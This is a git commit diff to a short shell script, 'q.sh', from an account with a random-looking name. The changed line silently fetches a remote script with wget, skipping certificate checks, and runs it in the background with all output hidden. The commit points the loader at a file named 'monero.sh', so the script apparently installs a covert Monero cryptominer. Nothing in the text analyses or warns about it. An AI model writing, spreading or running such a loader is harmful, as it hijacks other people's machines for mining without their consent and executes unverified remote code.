122949ef913879cd0460930fce4c44a9d158d6a5
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2025-03-01 12:04:08 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/qiyywnbc/main/q.sh_x) >/dev/null 2>&1 &
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/qiyywnbc/main/monero.sh) >/dev/null 2>&1 &
